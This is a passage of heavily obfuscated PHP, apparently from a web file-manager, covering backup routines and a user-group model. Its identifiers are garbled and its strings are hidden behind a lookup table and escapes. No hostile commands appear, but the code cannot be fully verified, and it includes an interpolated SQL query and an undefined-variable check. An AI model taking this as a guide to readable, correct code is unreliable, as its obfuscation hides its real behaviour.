$äŞ¸Ÿ‹Ñ[859] => array($äŞ¸Ÿ‹Ñ[846] => 0, $äŞ¸Ÿ‹Ñ[855] => 0, $äŞ¸Ÿ‹Ñ[856] => 0, $äŞ¸Ÿ‹Ñ[857] => 0, $äŞ¸Ÿ‹Ñ[858] => 0), $äŞ¸Ÿ‹Ñ[241] => array($äŞ¸Ÿ‹Ñ[846] => 0, $äŞ¸Ÿ‹Ñ[860] => 0, $äŞ¸Ÿ‹Ñ[861] => 0, $äŞ¸Ÿ‹Ñ[862] => 0, $äŞ¸Ÿ‹Ñ[863] => 0, $äŞ¸Ÿ‹Ñ[561] => $‹Ö±·›Å, $äŞ¸Ÿ‹Ñ[857] => 0, $äŞ¸Ÿ‹Ñ[858] => 0)), $äŞ¸Ÿ‹Ñ[857] => time(), $äŞ¸Ÿ‹Ñ[858] => 0); $¸½Ûş™Ó = $this->model->insert($ÄÉûİî£); $ÄÉûİî£[$äŞ¸Ÿ‹Ñ[491]] = $¸½Ûş™Ó; return $ÄÉûİî£; } private function checkStore($°Ïœä‹„) { $Õîë£º³ = Model($_SERVER[‰‰Ş‚€][864]); $‡º¯°‹ = $Õîë£º³->listData($°Ïœä‹„); $Õîë£º³->checkConfig($‡º¯°‹); } public static function get() { if (!self::$option) { $†— ¹ùÛ = Model($_SERVER[‰‰Ş‚€][844]); $Üõ‘á­é = $†— ¹ùÛ->findByName(self::$name); $†— ¹ùÛ->parseContent($Üõ‘á­é); self::$option = $Üõ‘á­é; } return self::$option; } public static function set($”áò©‘¦) { $ûÊß•Í =& $_SERVER[‰‰Ş‚€]; $êÖ“î” = self::get(); foreach ($”áò©‘¦ as $×›øº•À => $¦¯Ùè’Ğ) { array_set_value($êÖ“î”, $×›øº•À, $¦¯Ùè’Ğ); } Model($ûÊß•Í[844])->update($êÖ“î”[$ûÊß•Í[491]], $êÖ“î”); self::$option = $êÖ“î”; return self::$option; } public function keep() { $‰ŸÎĞ“± =& $_SERVER[‰‰Ş‚€]; $Š¬çÖ = self::get(); if (_get($Š¬çÖ, $‰ŸÎĞ“±[865], 0) == $‰ŸÎĞ“±[101]) { return; } $this->backupKeep($Š¬çÖ); self::set(array($‰ŸÎĞ“±[865] => 1)); } private function backupKeep($•–Î ›) { $æú‰Ú‰° =& $_SERVER[‰‰Ş‚€]; if (self::$manual == 1) { return; } $ë÷Ûáœ´ = $this->model->listData(); if (empty($ë÷Ûáœ´)) { return; } $ÃÄ”Á›Á = array(); $áò§½«¯ = array(); $œœ½²Š = date($æú‰Ú‰°[866], strtotime($æú‰Ú‰°[867])); foreach ($ë÷Ûáœ´ as $ôÎ¬õ™À => $íËèÀó¦) { $œ¨²¢À = $íËèÀó¦[$æú‰Ú‰°[42]]; if ($ôÎ¬õ™À < 7 || $íËèÀó¦[$æú‰Ú‰°[851]] == $æú‰Ú‰°[101]) { $ÃÄ”Á›Á[] = $œ¨²¢À; continue; } $”“Ëİİ = substr($œ¨²¢À, 0, 6); if ($”“Ëİİ < $œœ½²Š) { continue; } if (!isset($áò§½«¯[$”“Ëİİ]) || $œ¨²¢À < $áò§½«¯[$”“Ëİİ]) { $áò§½«¯[$”“Ëİİ] = $œ¨²¢À; } if (substr($œ¨²¢À, 6, 2) == $æú‰Ú‰°[868]) { $áò§½«¯[$”“Ëİİ] = $œ¨²¢À; } } $ÃÄ”Á›Á = array_merge($ÃÄ”Á›Á, array_values($áò§½«¯)); $ÃÄ”Á›Á = array_unique($ÃÄ”Á›Á); foreach ($ë÷Ûáœ´ as $íËèÀó¦) { $œ¨²¢À = $íËèÀó¦[$æú‰Ú‰°[42]]; if (!empty($œ¨²¢À) && in_array($œ¨²¢À, $ÃÄ”Á›Á)) { continue; } $this->model->remove($íËèÀó¦[$æú‰Ú‰°[491]]); $ã’œ•… = $this->backupPath($•–Î ›); IO::remove($ã’œ•…, !1); } } private function backupPath($ş±ë­å) { $Ï‰£”²­ =& $_SERVER[‰‰Ş‚€]; static $ˆˆ¢»‚¾ = null; if (is_null($ˆˆ¢»‚¾)) { $ˆˆ¢»‚¾ = Model($Ï‰£”²­[869])->get($Ï‰£”²­[870]); } $÷…Íª» = $ş±ë­å[$Ï‰£”²­[42]]; $ÄááÙ” = substr(md5($Ï‰£”²­[871] . $ˆˆ¢»‚¾ . $÷…Íª»), 0, 8); return "\173\151\157\72{$ş±ë­å[$Ï‰£”²­[848]]}\175\57\x64\x61\164\x61\142\141\163\x65\57\x62\x61\x63\153\165\160\57" . $÷…Íª» . $Ï‰£”²­[21] . $ÄááÙ”; } public function db() { $±œ¾»àÄ =& $_SERVER[‰‰Ş‚€]; $°‰„ßø¥ = self::get(); if (_get($°‰„ßø¥, $±œ¾»àÄ[872], 0) == $±œ¾»àÄ[101]) { return !0; } $ø®ªÄñ = new BackupDb(); if (!$ø®ªÄñ->index()) { return !1; } self::set(array($±œ¾»àÄ[872] => 1)); return !0; } public function dbFile() { $÷ µª… =& $_SERVER[‰‰Ş‚€]; $åÛúÖæø = self::get(); if (_get($åÛúÖæø, $÷ µª…[873], 0) == $÷ µª…[101]) { return !0; } $ àˆüç = new BackupDbFile(); if (!$ àˆüç->index()) { return !1; } self::set(array($÷ µª…[873] => 1)); return !0; } public function file() { $»½ÃºÔ =& $_SERVER[‰‰Ş‚€]; $¡ß·íÕ = self::get(); if (_get($¡ß·íÕ, $»½ÃºÔ[874], 0) == $»½ÃºÔ[101]) { return !0; } if ($¡ß·íÕ[$»½ÃºÔ[179]] == $»½ÃºÔ[875]) { $±œñæÏ£ = new BackupFile(); if (!$±œñæÏ£->index()) { return !1; } } self::set(array($»½ÃºÔ[874] => 1, $»½ÃºÔ[846] => 1)); return !0; } public static function log($Îãï¢‡í) { write_log($Îãï¢‡í, $_SERVER[‰‰Ş‚€][876]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Œ©¯¦µÄ =& $_SERVER[‰‰Ş‚€]; $™œĞôâ¼ = Backup::get(); self::$io = $™œĞôâ¼[$Œ©¯¦µÄ[848]]; self::$name = $™œĞôâ¼[$Œ©¯¦µÄ[42]]; $Æ¤í„¹— = new DbManage(); $ÅŞü·÷Ê = $Æ¤í„¹—->dbType(); $æà¦°Á“ = array($Œ©¯¦µÄ[877] => $ÅŞü·÷Ê, $Œ©¯¦µÄ[878] => time()); Backup::set($æà¦°Á“); $ü±çŠŠ = $this->tmpFilesPath() . $Œ©¯¦µÄ[879] . self::$name . $Œ©¯¦µÄ[18]; del_dir($ü±çŠŠ); mk_dir($ü±çŠŠ); $½«ôïé¦ = $ŞÂ£˜ = 0; try { $‡Å´ú“‰ = $Æ¤í„¹—->db()->getTables(); } catch (Exception $‚ÁİÂÕ) { Backup::log($Œ©¯¦µÄ[880] . $‚ÁİÂÕ->getMessage()); return !1; } $‡Å´ú“‰ = array_diff($‡Å´ú“‰, array($Œ©¯¦µÄ[881], $Œ©¯¦µÄ[882])); foreach ($‡Å´ú“‰ as $‘îô¥Ñæ) { if ($‘îô¥Ñæ == $Œ©¯¦µÄ[883]) { continue; } $½«ôïé¦ += $Æ¤í„¹—->model($‘îô¥Ñæ)->count(); } $•¼àèÏ = new Task($Œ©¯¦µÄ[884], $Œ©¯¦µÄ[876], $½«ôïé¦, LNG($Œ©¯¦µÄ[885]) . $Œ©¯¦µÄ[886] . LNG($Œ©¯¦µÄ[887])); $GLOBALS[$Œ©¯¦µÄ[888]] = self::$name; foreach ($‡Å´ú“‰ as $‘îô¥Ñæ) { $Õ‰úˆÀØ = $ü±çŠŠ . $‘îô¥Ñæ . $Œ©¯¦µÄ[889]; if ($‘îô¥Ñæ == $Œ©¯¦µÄ[883]) { @touch($Õ‰úˆÀØ); continue; } $‡Ü­Ş€­ = null; if ($‘îô¥Ñæ == $Œ©¯¦µÄ[890] && $™œĞôâ¼[$Œ©¯¦µÄ[179]] == $Œ©¯¦µÄ[875]) { $‡Ü­Ş€­ = self::$io; } $ŞÂ£˜ += $Æ¤í„¹—->sqlFromDb($‘îô¥Ñæ, $Õ‰úˆÀØ, $•¼àèÏ, $‡Ü­Ş€­); } unset($GLOBALS[$Œ©¯¦µÄ[888]]); $•¼àèÏ->end(); if ($ŞÂ£˜ > $½«ôïé¦) { $½«ôïé¦ = $ŞÂ£˜; } $æà¦°Á“ = array($Œ©¯¦µÄ[877] => $ÅŞü·÷Ê, $Œ©¯¦µÄ[872] => 1, $Œ©¯¦µÄ[891] => $½«ôïé¦, $Œ©¯¦µÄ[892] => $ŞÂ£˜, $Œ©¯¦µÄ[893] => time()); Backup::set($æà¦°Á“); if ($½«ôïé¦ - $ŞÂ£˜ > 0) { $Ë¨Ä¾â¯ = $Œ©¯¦µÄ[894]; if (!stristr(I18n::getType(), $Œ©¯¦µÄ[895])) { $Ë¨Ä¾â¯ = $Œ©¯¦µÄ[896]; } Backup::log(array($Ë¨Ä¾â¯, $æà¦°Á“)); return !1; } return !0; } private function tmpFilesPath() { $¹–áëû± =& $_SERVER[‰‰Ş‚€]; $ííâ§€ = TEMP_FILES; if ($GLOBALS[$¹–áëû±[16]][$¹–áëû±[102]][$¹–áëû±[897]]) { $ííâ§€ = $GLOBALS[$¹–áëû±[16]][$¹–áëû±[102]][$¹–áëû±[897]]; if (!mk_dir($ííâ§€) || !is_writable($ííâ§€) || !IO::mkfile($ííâ§€ . $¹–áëû±[898])) { $ííâ§€ = TEMP_FILES; } } return $ííâ§€; } } goto f’îÏ½©Ìê; D¸Ê•£§éİ: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\x75\x70"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\141\x6d\x65" => "\147\162\157\x75\x70\137\x6d\145\164\141", "\x6d\x65\x74\x61\x46\151\x65\154\x64" => "\x67\x72\x6f\165\x70\x49\x44"); protected function cacheFunctionAlias($ÊåŸ·¸Æ) { $…É‰øûŒ =& $_SERVER[‰‰Ş‚€]; return array($…É‰øûŒ[2102] => array($ÊåŸ·¸Æ[0], $…É‰øûŒ[2103]), $…É‰øûŒ[2104] => array($ÊåŸ·¸Æ[0], $…É‰øûŒ[2105])); } protected function getInfo($‰ºøû§, $É¥ˆ©¨Ø = false) { $ÊëŒÍÕµ = $this->getInfoSimple($‰ºøû§); if (!$ÊëŒÍÕµ) { return !1; } if ($É¥ˆ©¨Ø) { return $this->_listDataApplyItem($ÊëŒÍÕµ); } return $this->cacheFunctionGet($_SERVER[‰‰Ş‚€][2106], $‰ºøû§); } protected function getInfoSimple($ŞÀªÏÕÚ, $»×óÓÃô = false) { $úøÀ‹½‹ =& $_SERVER[‰‰Ş‚€]; if ($»×óÓÃô) { $‘ğú™È¥ = array($úøÀ‹½‹[1429] => intval($ŞÀªÏÕÚ)); $™¬¬ —– = $this->where($‘ğú™È¥)->find(); return is_array($™¬¬ —–) ? $™¬¬ —– : array(); } return $this->cacheFunctionGet($úøÀ‹½‹[2107], $ŞÀªÏÕÚ); } protected function groupAdd($¡§âÏ) { $½ü£­—ê =& $_SERVER[‰‰Ş‚€]; if (!$¡§âÏ[$½ü£­—ê[201]] && isset($¡§âÏ[$½ü£­—ê[1429]]) && $¡§âÏ[$½ü£­—ê[1429]] == 1) { if ($«ªà÷Ù = $this->getInfoSimple($¡§âÏ[$½ü£­—ê[1429]], !0)) { return $¡§âÏ[$½ü£­—ê[1429]]; } } else { $«ªà÷Ù = $this->getInfoSimple($¡§âÏ[$½ü£­—ê[201]]); if (!$«ªà÷Ù) { return !1; } } $ŞúÃÜß§ = $½ü£­—ê[613]; if ($«ªà÷Ù[$½ü£­—ê[604]]) { $ŞúÃÜß§ = $«ªà÷Ù[$½ü£­—ê[604]] . $«ªà÷Ù[$½ü£­—ê[1429]] . $½ü£­—ê[60]; } $ößÈ»àˆ = array($½ü£­—ê[513] => $this->groupNameAuto($¡§âÏ[$½ü£­—ê[201]], $¡§âÏ[$½ü£­—ê[42]]), $½ü£­—ê[496] => $¡§âÏ[$½ü£­—ê[201]], $½ü£­—ê[675] => $ŞúÃÜß§, $½ü£­—ê[2108] => $¡§âÏ[$½ü£­—ê[2007]], $½ü£­—ê[2109] => 0, $½ü£­—ê[2024] => 0); $¡§âÏ[$½ü£­—ê[42]] = $ößÈ»àˆ[$½ü£­—ê[42]]; if (isset($¡§âÏ[$½ü£­—ê[2044]])) { $ößÈ»àˆ[$½ü£­—ê[2044]] = $¡§âÏ[$½ü£­—ê[2044]]; } else { $÷É™˜€Î = $this->max($½ü£­—ê[2044]); if (!$÷É™˜€Î) { $÷É™˜€Î = 0; } $ößÈ»àˆ[$½ü£­—ê[2044]] = $÷É™˜€Î + 1; } if (!empty($¡§âÏ[$½ü£­—ê[1429]])) { $ößÈ»àˆ[$½ü£­—ê[1429]] = $¡§âÏ[$½ü£­—ê[1429]]; } $ÁûÚ€şî = $this->add($ößÈ»àˆ); $this->groupMetaEdit($ÁûÚ€şî, $¡§âÏ); Model($½ü£­—ê[1467])->groupRootAdd($ÁûÚ€şî); $this->_clearCache($¡§âÏ[$½ü£­—ê[201]]); return $ÁûÚ€şî; } protected function groupEdit($Û’ƒãæ‰, $ñÓ€İ¦) { $­¼ü–ÀÛ =& $_SERVER[‰‰Ş‚€]; $ÉË²¥¦¨ = $this->getInfoSimple($Û’ƒãæ‰); if (!$ÉË²¥¦¨) { return !1; } if (!empty($ñÓ€İ¦[$­¼ü–ÀÛ[201]])) { $­Şå¥ËÅ = $this->getInfoSimple($ñÓ€İ¦[$­¼ü–ÀÛ[201]]); if (!$­Şå¥ËÅ) { return !1; } if ($ÉË²¥¦¨[$­¼ü–ÀÛ[1429]] == $­Şå¥ËÅ[$­¼ü–ÀÛ[1429]]) { return !1; } if ($ñÓ€İ¦[$­¼ü–ÀÛ[201]] != $ÉË²¥¦¨[$­¼ü–ÀÛ[201]]) { if ($­Şå¥ËÅ[$­¼ü–ÀÛ[604]] !== $ÉË²¥¦¨[$­¼ü–ÀÛ[604]] && strpos($­Şå¥ËÅ[$­¼ü–ÀÛ[604]], $ÉË²¥¦¨[$­¼ü–ÀÛ[604]] . $ÉË²¥¦¨[$­¼ü–ÀÛ[1429]] . $­¼ü–ÀÛ[60]) === 0) { return !1; } $ñÓ€İ¦[$­¼ü–ÀÛ[675]] = $­Şå¥ËÅ[$­¼ü–ÀÛ[604]] . $ñÓ€İ¦[$­¼ü–ÀÛ[201]] . $­¼ü–ÀÛ[60]; $this->_changeChildLevel($ÉË²¥¦¨, $­Şå¥ËÅ); $this->_clearCache($­Şå¥ËÅ[$­¼ü–ÀÛ[1429]]); $this->_clearCache($ÉË²¥¦¨[$­¼ü–ÀÛ[201]]); } } $this->groupMetaEdit($Û’ƒãæ‰, $ñÓ€İ¦); $this->_clearChildrenCache($ÉË²¥¦¨); return $this->where(array($­¼ü–ÀÛ[2110] => $Û’ƒãæ‰))->save($ñÓ€İ¦); } private function groupMetaEdit($ÖÍ‹˜Øİ, &$Üòİçõ ) { $û¥Å•‡ =& $_SERVER[‰‰Ş‚€]; if (isset($Üòİçõ [$û¥Å•‡[42]])) { $this->setNamePinyin($ÖÍ‹˜Øİ, $Üòİçõ [$û¥Å•‡[42]]); } if (isset($Üòİçõ [$û¥Å•‡[2111]])) { $²Ñıı«Œ = array($û¥Å•‡[2111] => $Üòİçõ [$û¥Å•‡[2111]], $û¥Å•‡[2112] => $Üòİçõ [$û¥Å•‡[2112]]); unset($Üòİçõ [$û¥Å•‡[2111]]); unset($Üòİçõ [$û¥Å•‡[2112]]); if (isset($Üòİçõ [$û¥Å•‡[2113]])) { $‰ÉÒî… = $û¥Å•‡[1425] . $ÖÍ‹˜Øİ; $©Ì—ÚÅ = $û¥Å•‡[1424]; $š˜³œó = $Üòİçõ [$û¥Å•‡[2113]] ? $Üòİçõ [$û¥Å•‡[2113]] : $û¥Å•‡[22]; $†ÕŠ†Ó = Model($û¥Å•‡[1423])->get($‰ÉÒî…, $©Ì—ÚÅ); $†ÕŠ†Ó = $†ÕŠ†Ó ? $†ÕŠ†Ó : $û¥Å•‡[22]; if ($†ÕŠ†Ó != $š˜³œó) { if (!$š˜³œó && $†ÕŠ†Ó) { Model($û¥Å•‡[1423])->remove($‰ÉÒî…, $©Ì—ÚÅ); } else { if ($š˜³œó) { Model($û¥Å•‡[1423])->set($‰ÉÒî…, $š˜³œó, $©Ì—ÚÅ); } } } $²Ñıı«Œ[$û¥Å•‡[2113]] = $š˜³œó; } $this->metaSet($ÖÍ‹˜Øİ, $²Ñıı«Œ); } } private function _clearChildrenCache($™Èñî ) { $ÍÉˆÏëŒ =& $_SERVER[‰‰Ş‚€]; $ŠØ—òÒ§ = array($ÍÉˆÏëŒ[675] => array($ÍÉˆÏëŒ[635], $™Èñî [$ÍÉˆÏëŒ[604]] . $™Èñî [$ÍÉˆÏëŒ[1429]] . $ÍÉˆÏëŒ[636])); $»Î½õÏ = $this->field($ÍÉˆÏëŒ[1429])->where($ŠØ—òÒ§)->select(); foreach ($»Î½õÏ as $©¥âËğ‹) { $this->_clearCache($©¥âËğ‹[$ÍÉˆÏëŒ[1429]]); } } private function _clearCache($ÀÉ‘Ş„º) { $“Àä Üû =& $_SERVER[‰‰Ş‚€]; $this->cacheFunctionClear($“Àä Üû[2106], $ÀÉ‘Ş„º); $this->cacheFunctionClear($“Àä Üû[2107], $ÀÉ‘Ş„º); } private function _changeChildLevel($É¿Å´Û, $ÑâÃ¡ Â, $’ğèŒ÷É = false) { $áÂ™¬ƒø =& $_SERVER[‰‰Ş‚€]; $†Ş³´•  = $É¿Å´Û[$áÂ™¬ƒø[604]] . $É¿Å´Û[$áÂ™¬ƒø[1429]] . $áÂ™¬ƒø[60]; $–ÚœïÍ = $ÑâÃ¡ Â[$áÂ™¬ƒø[604]] . $ÑâÃ¡ Â[$áÂ™¬ƒø[1429]] . $áÂ™¬ƒø[60] . $É¿Å´Û[$áÂ™¬ƒø[1429]] . $áÂ™¬ƒø[60]; if ($’ğèŒ÷É) { $–ÚœïÍ = $ÑâÃ¡ Â[$áÂ™¬ƒø[604]] . $ÑâÃ¡ Â[$áÂ™¬ƒø[1429]] . $áÂ™¬ƒø[60]; } $íÚ¦­¿Í = array($áÂ™¬ƒø[675] => array($áÂ™¬ƒø[635], $É¿Å´Û[$áÂ™¬ƒø[604]] . $É¿Å´Û[$áÂ™¬ƒø[1429]] . $áÂ™¬ƒø[636])); $Ğïç„¸¦ = array($áÂ™¬ƒø[675] => array($áÂ™¬ƒø[684], "\162\x65\x70\154\x61\143\x65\50\x70\141\162\145\x6e\x74\x4c\145\x76\x65\x6c\x2c\x27{$†Ş³´• }\47\x2c\x27{$–ÚœïÍ}\47\51")); $this->_clearChildrenCache($É¿Å´Û); $this->where($íÚ¦­¿Í)->data($Ğïç„¸¦)->save(); } public function setNamePinyin($È™Ëû , $êßãöÈÚ = false) { $ÔªåÅá =& $_SERVER[‰‰Ş‚€]; if (!$êßãöÈÚ) { $ÌïÉ°‚œ = $this->getInfoSimple($È™Ëû ); $êßãöÈÚ = $ÌïÉ°‚œ[$ÔªåÅá[42]]; } if (!Input::check($êßãöÈÚ, $ÔªåÅá[678])) { $this->metaSet($È™Ëû , $ÔªåÅá[556], null); $this->metaSet($È™Ëû , $ÔªåÅá[555], null); return; } $İÌÇâø = array($ÔªåÅá[556] => str_replace($ÔªåÅá[63], $ÔªåÅá[22], Pinyin::get($êßãöÈÚ)), $ÔªåÅá[555] => Pinyin::get($êßãöÈÚ, $ÔªåÅá[679])); $this->metaSet($È™Ëû , $İÌÇâø); } protected function metaSet($­ ˆ­²º, $÷™ÃÍ• = null, $Æš‹–ë¡ = null) { $this->_clearCache($­ ˆ­²º); return parent::metaSet($­ ˆ­²º, $÷™ÃÍ•, $Æš‹–ë¡); } protected function groupStatus($ÖÇ½¬™ã, $’É¾±ĞÏ) { $ÃÈ æ¶ø =& $_SERVER[‰‰Ş‚€]; $ˆû£×  = $this->getInfoSimple($ÖÇ½¬™ã); if (!$ˆû£× ) { return !1; } $this->_clearCache($ÖÇ½¬™ã); return $this->metaSet($ÖÇ½¬™ã, $ÃÈ æ¶ø[846], $’É¾±ĞÏ); if ($’É¾±ĞÏ == $ÃÈ æ¶ø[101]) { $ŞÛ¢»Ì£ = $this->parentLevelArray($ˆû£× [$ÃÈ æ¶ø[604]]); } else { } $ŞÛ¢»Ì£[] = $ˆû£× [$ÃÈ æ¶ø[1429]]; $óöŒîªÈ = array(); foreach ($ŞÛ¢»Ì£ as $ÖÇ½¬™ã) { $óöŒîªÈ[] = array($ÃÈ æ¶ø[1429] => $ÖÇ½¬™ã, $ÃÈ æ¶ø[105] => $ÃÈ æ¶ø[846], $ÃÈ æ¶ø[459] => $’É¾±ĞÏ); $this->_clearCache($ÖÇ½¬™ã); } return Model($ÃÈ æ¶ø[2114])->addAll($óöŒîªÈ, array(), !0); } protected function groupRemove($úÅùĞœÜ, $¹”«òêë = false) { $ññÓ¨ØØ =& $_SERVER[‰‰Ş‚€]; $ø×¤”ôš = array($ññÓ¨ØØ[1429] => $úÅùĞœÜ); $ÑÛŒè¼« = $this->where($ø×¤”ôš)->find(); if (!$ÑÛŒè¼« || $ÑÛŒè¼«[$ññÓ¨ØØ[201]] == 0) { return !1; } if (!$¹”«òêë) { $İùÙšß‹ = $this->getInfoSimple($ÑÛŒè¼«[$ññÓ¨ØØ[201]]); $this->_changeChildLevel($ÑÛŒè¼«, $İùÙšß‹, !0); $this->where(array($ññÓ¨ØØ[201] => $úÅùĞœÜ))->save(array($ññÓ¨ØØ[201] => $ÑÛŒè¼«[$ññÓ¨ØØ[201]])); $this->_clearCache($İùÙšß‹[$ññÓ¨ØØ[1429]]); } Model($ññÓ¨ØØ[2114])->where($ø×¤”ôš)->delete(); Model($ññÓ¨ØØ[2115])->where($ø×¤”ôš)->delete(); Model($ññÓ¨ØØ[929])->groupRootRemove($úÅùĞœÜ); $this->_clearCache($ÑÛŒè¼«[$ññÓ¨ØØ[201]]); return $this->where($ø×¤”ôš)->delete(); } protected function groupSort($ı“–“ËÀ) { $¹‡Ïü­É =& $_SERVER[‰‰Ş‚€]; $Æèı»ıÛ = array(); foreach ($ı“–“ËÀ as $±“›é”À => $µ¿ûƒçî) { $Æèı»ıÛ[] = array($¹‡Ïü­É[1429], $µ¿ûƒçî, $¹‡Ïü­É[2044], $±“›é”À + 1); } $this->saveAll($Æèı»ıÛ); } public function listData() { $³†—ä¼ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($³†—ä¼[$_SERVER[‰‰Ş‚€][454]]); return $³†—ä¼; } private function _makeOrder($‘Ö¤œ« = '') { $Ø ¢ôÄ =& $_SERVER[‰‰Ş‚€]; $“Ä âı² = array($Ø ¢ôÄ[1429], $Ø ¢ôÄ[42], $Ø ¢ôÄ[2009], $Ø ¢ôÄ[242]); $ÚõÜéìé = array($Ø ¢ôÄ[541] => $Ø ¢ôÄ[542], $Ø ¢ôÄ[543] => $Ø ¢ôÄ[544]); $íÄæÃÍÎ = Input::get($Ø ¢ôÄ[548], $Ø ¢ôÄ[17], $Ø ¢ôÄ[2024], $“Ä âı²); $Œü…Îº¨ = Input::get($Ø ¢ôÄ[549], $Ø ¢ôÄ[17], $Ø ¢ôÄ[2116], array($Ø ¢ôÄ[2116], $Ø ¢ôÄ[543])); $Œü…Îº¨ = $ÚõÜéìé[$Œü…Îº¨]; $‘Ö¤œ« = $‘Ö¤œ« . "{$íÄæÃÍÎ}\x20{$Œü…Îº¨}\x2c\x20\x67\x72\x6f\165\x70\x49\104\40\x61\x73\x63"; return $this->order($‘Ö¤œ«); } public function listChild($¯šÁË¢) { $£…ºáÊƒ =& $_SERVER[‰‰Ş‚€]; $ÙäÍ÷şö = $this->where(array($£…ºáÊƒ[201] => $¯šÁË¢))->_makeOrder()->selectPage(200); $this->_listDataApply($ÙäÍ÷şö[$£…ºáÊƒ[454]]); return $ÙäÍ÷şö; } public function listChildIds($şÙ‹Í) { $ü‚°Ì±Ê =& $_SERVER[‰‰Ş‚€]; if (is_string($Í²¼Ë¸¸)) { $şÙ‹Í = explode($ü‚°Ì±Ê[60], $şÙ‹Í); } $¸ß¤¸Á¥ = $this->where(array($ü‚°Ì±Ê[1429] => array($ü‚°Ì±Ê[17], $şÙ‹Í)))->field($ü‚°Ì±Ê[2117])->select(); if (!$¸ß¤¸Á¥) { return !1; } $ä±ŞğÕÇ = array(); foreach ($¸ß¤¸Á¥ as $‹›‡ë¹¶) { $ä±ŞğÕÇ[] = "\163\145\x6c\x65\x63\x74\x20\x67\x72\x6f\x75\160\x49\104\40\146\162\x6f\155\40\x60\147\162\157\x75\x70\140\40\x77\150\x65\162\145\40\160\x61\162\x65\x6e\x74\114\145\x76\x65\x6c\40\x6c\151\153\145\x20\x27{$‹›‡ë¹¶[$ü‚°Ì±Ê[604]]}{$‹›‡ë¹¶[$ü‚°Ì±Ê[1429]]}\54\x25\x27"; } $ä±ŞğÕÇ = implode($ü‚°Ì±Ê[2118], $ä±ŞğÕÇ); $¸ß¤¸Á¥ = $this->query($ä±ŞğÕÇ); if (!$¸ß¤¸Á¥) { return array(); } $şÙ‹Í = array_to_keyvalue($¸ß¤¸Á¥, $ü‚°Ì±Ê[22], $ü‚°Ì±Ê[1429]); return array_unique($şÙ‹Í); } public function listByID($”£õÚ«Ï) { $ÒÍÀª°Ë =& $_SERVER[‰‰Ş‚€]; if (!$”£õÚ«Ï) { return array(); } $˜“Àşñê = array($ÒÍÀª°Ë[1429] => array($ÒÍÀª°Ë[17], $”£õÚ«Ï)); $Öó«´ = $this->where($˜“Àşñê)->select(); $Öó«´ = array_sort_keep($Öó«´, $ÒÍÀª°Ë[1429], $”£õÚ«Ï); $this->_listDataApply($Öó«´); return $Öó«´; } public function listSearch($½¢¦ßìó) { $ìøëÏŸ =& $_SERVER[‰‰Ş‚€]; $™ûºéô¸ = trim($½¢¦ßìó[$ìøëÏŸ[2119]]); $âôÚã•Ó = explode($ìøëÏŸ[63], $™ûºéô¸); if (!$™ûºéô¸ || count($âôÚã•Ó) == 1) { return $this->listSearchNow($½¢¦ßìó); } $„²¤“Éº = array($ìøëÏŸ[454] => array()); foreach ($âôÚã•Ó as $¤ªªêş) { if (!trim($¤ªªêş)) { continue; } $½¢¦ßìó[$ìøëÏŸ[2119]] = $¤ªªêş; $©Ñ¾¦Û´ = $this->listSearchNow($½¢¦ßìó); $„²¤“Éº[$ìøëÏŸ[454]] = array_merge($„²¤“Éº[$ìøëÏŸ[454]], $©Ñ¾¦Û´[$ìøëÏŸ[454]]); } $„²¤“Éº[$ìøëÏŸ[454]] = array_unique_by_key($„²¤“Éº[$ìøëÏŸ[454]], $ìøëÏŸ[1429]); $„²¤“Éº[$ìøëÏŸ[451]] = array($ìøëÏŸ[452] => count($„²¤“Éº[$ìøëÏŸ[454]]), $ìøëÏŸ[448] => 20, $ìøëÏŸ[437] => 1, $ìøëÏŸ[453] => 1); return $„²¤“Éº; } public function listSearchNow($ö¹Ëş·‚) { $éÍˆµ =& $_SERVER[‰‰Ş‚€]; $”ğÅŸ‘ª = trim($ö¹Ëş·‚[$éÍˆµ[2119]]); $ì¢˜”ğ¨ = isset($ö¹Ëş·‚[$éÍˆµ[2120]]) ? $ö¹Ëş·‚[$éÍˆµ[2120]] : !1; if (!trim($”ğÅŸ‘ª)) { return !1; } $”ğÅŸ‘ª = str_replace($éÍˆµ[2121], $éÍˆµ[2122], $”ğÅŸ‘ª); $š…‹†á¤ = array($éÍˆµ[1429] => array($éÍˆµ[478], "{$”ğÅŸ‘ª}\x25"), $éÍˆµ[42] => array($éÍˆµ[478], "\x25{$”ğÅŸ‘ª}\x25"), $éÍˆµ[1110] => $éÍˆµ[2123]); if ($ì¢˜”ğ¨) { $†šÁÉæÔ = $this->getInfoSimple($ì¢˜”ğ¨); $œ´Ø½Ìş = $†šÁÉæÔ[$éÍˆµ[604]] . $ì¢˜”ğ¨ . $éÍˆµ[636]; $š…‹†á¤ = array($š…‹†á¤, array($éÍˆµ[604] => array($éÍˆµ[478], $œ´Ø½Ìş))); } $š…‹†á¤ = $this->parseWhereLike($š…‹†á¤); $ßÛ˜‚ = $this->_makeOrder()->where($š…‹†á¤)->selectPage(20); $ßÛ˜‚ = $ßÛ˜‚ ? $ßÛ˜‚ : array($éÍˆµ[454] => array(), $éÍˆµ[451] => array()); if (!$ßÛ˜‚ || count($ßÛ˜‚[$éÍˆµ[454]]) < 5 && Input::check($”ğÅŸ‘ª, $éÍˆµ[402])) { $™ä”•ø¥ = $this->groupChildrenAll($ì¢˜”ğ¨); $²¯ˆç = $this->_searchFromMeta($éÍˆµ[555], $”ğÅŸ‘ª, 10, $™ä”•ø¥); $™»«Åˆ = $this->_searchFromMeta($éÍˆµ[556], $”ğÅŸ‘ª, 10, $™ä”•ø¥); $ù®¹¨ã = array_merge($²¯ˆç, $™»«Åˆ, $ßÛ˜‚[$éÍˆµ[454]]); $ßÛ˜‚[$éÍˆµ[454]] = array_unique_by_key($ù®¹¨ã, $éÍˆµ[1429]); $ßÛ˜‚[$éÍˆµ[451]][$éÍˆµ[452]] = count($ßÛ˜‚[$éÍˆµ[454]]); $ßÛ˜‚[$éÍˆµ[451]][$éÍˆµ[453]] = ceil($ßÛ˜‚[$éÍˆµ[451]][$éÍˆµ[452]] / $ßÛ˜‚[$éÍˆµ[451]][$éÍˆµ[448]]); } $this->_listDataApply($ßÛ˜‚[$éÍˆµ[454]]); return $ßÛ˜‚; } protected function groupChildrenAll($®ã¤şĞ) { $Š³«¼ºÜ =& $_SERVER[‰‰Ş‚€]; if (!$®ã¤şĞ) { return !1; } if (!is_array($®ã¤şĞ)) { $®ã¤şĞ = array($®ã¤şĞ); } $Õö­ÆÃ¯ = $®ã¤şĞ; foreach ($®ã¤şĞ as $Şè®áÂ) { 